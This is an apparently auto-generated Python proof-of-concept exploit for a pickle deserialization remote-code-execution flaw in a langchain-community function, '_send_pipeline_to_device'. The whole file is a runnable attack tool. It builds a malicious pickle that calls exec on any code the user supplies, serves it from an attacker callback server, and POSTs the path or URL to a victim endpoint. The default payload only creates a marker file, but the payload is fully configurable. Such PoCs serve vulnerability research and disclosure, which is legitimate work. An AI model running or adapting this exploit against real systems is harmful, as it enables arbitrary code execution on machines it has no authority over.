#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_if_string_opens_calls__send_pipeline_to_device_4.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only pickle deserialization RCE.

Vulnerability: _send_pipeline_to_device accepts a 'pipeline' parameter. If it is a string,
it opens the file and calls pickle.load on its contents. An attacker who can control the
'pipeline' parameter can provide a path to a malicious pickle file, leading to arbitrary
code execution.

This PoC:
1. Creates a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosts it via a simple HTTP server (or writes it locally if the target reads from filesystem)
3. Triggers the vulnerable function by sending a request to the simulated endpoint

Usage:
    python3 poc.py --target http://victim:8000 --callback http://attacker:9999/payload.pkl
    or
    python3 poc.py --target http://victim:8000 --local-path /tmp/evil.pkl
"""

import argparse
import base64
import http.server
import json
import os
import pickle
import socket
import subprocess
import sys
import threading
import time
import urllib.request
import urllib.error

# Benign payload: creates a marker file to prove code execution
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

def create_malicious_pickle(payload_code: str) -> bytes:
    """Create a pickle payload that executes arbitrary Python code."""
    class EvilPickle(object):
        def __reduce__(self):
            return (exec, (payload_code,))
    
    return pickle.dumps(EvilPickle())

def start_callback_server(port: int, payload_bytes: bytes):
    """Start a simple HTTP server to serve the malicious pickle file."""
    class PayloadHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', str(len(payload_bytes)))
            self.end_headers()
            self.wfile.write(payload_bytes)
        
        def log_message(self, format, *args):
            print(f"[*] Callback server: {args[0]} {args[1]} {args[2]}")
    
    server = http.server.HTTPServer(('0.0.0.0', port), PayloadHandler)
    print(f"[*] Starting callback server on port {port}...")
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server

def exploit_via_url(target_url: str, callback_url: str):
    """
    Exploit by making the target load a pickle file from a remote URL.
    The vulnerable function expects a file path, but if the target has a wrapper
    that passes user input directly, we can point to a network path.
    """
    print(f"[*] Attempting exploit via URL: {callback_url}")
    print(f"[*] Target: {target_url}")
    
    # The simulated endpoint passes user input to _send_pipeline_to_device
    # We send the callback URL as the pipeline parameter
    payload = {
        "pipeline": callback_url  # This will be passed to the vulnerable function
    }
    
    try:
        req = urllib.request.Request(
            target_url,
            data=json.dumps(payload).encode(),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            print(f"[*] Response status: {response.status}")
            print(f"[*] Response body: {response.read().decode()[:200]}")
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        print(f"[*] Response: {e.read().decode()[:200]}")
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

def exploit_via_local_path(target_url: str, local_path: str):
    """
    Exploit by making the target load a pickle file from a local path.
    This assumes the attacker can write files to the target filesystem (e.g., via upload).
    """
    print(f"[*] Attempting exploit via local path: {local_path}")
    print(f"[*] Target: {target_url}")
    
    payload = {
        "pipeline": local_path  # This will be passed to the vulnerable function
    }
    
    try:
        req = urllib.request.Request(
            target_url,
            data=json.dumps(payload).encode(),
            headers={'Content-Type': 'application/json'},
            method='POST'
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            print(f"[*] Response status: {response.status}")
            print(f"[*] Response body: {response.read().decode()[:200]}")
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        print(f"[*] Response: {e.read().decode()[:200]}")
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

def main():
    parser = argparse.ArgumentParser(description='PoC for langchain-community pickle RCE')
    parser.add_argument('--target', required=True, help='Target URL (e.g., http://victim:8000/api/v1/trigger)')
    parser.add_argument('--callback', help='Callback URL for remote pickle (e.g., http://attacker:9999/payload.pkl)')
    parser.add_argument('--local-path', help='Local path on target for pickle file')
    parser.add_argument('--callback-port', type=int, default=9999, help='Port for callback server')
    parser.add_argument('--payload', default=BENIGN_PAYLOAD, help='Python code to execute (default: touch /tmp/poc_success.txt)')
    
    args = parser.parse_args()
    
    # Create malicious pickle
    print("[*] Creating malicious pickle payload...")
    payload_bytes = create_malicious_pickle(args.payload)
    print(f"[*] Payload size: {len(payload_bytes)} bytes")
    
    if args.callback:
        # Start callback server to serve the pickle
        server = start_callback_server(args.callback_port, payload_bytes)
        print(f"[*] Callback server ready at http://0.0.0.0:{args.callback_port}/")
        print(f"[*] Waiting a moment for server to start...")
        time.sleep(1)
        
        # Trigger exploit
        exploit_via_url(args.target, args.callback)
        
        # Keep server running for a bit to ensure delivery
        print("[*] Keeping callback server alive for 10 seconds...")
        time.sleep(10)
        server.shutdown()
    elif args.local_path:
        # Write pickle to local file (for testing or if attacker has write access)
        print(f"[*] Writing pickle to {args.local_path}...")
        with open(args.local_path, 'wb') as f:
            f.write(payload_bytes)
        print(f"[*] Pickle file written. Now trigger exploit...")
        exploit_via_local_path(args.target, args.local_path)
    else:
        print("[!] Must specify either --callback or --local-path")
        sys.exit(1)
    
    print("[*] Exploit attempt completed.")
    print("[*] Check if /tmp/poc_success.txt was created on the target.")

if __name__ == '__main__':
    main()
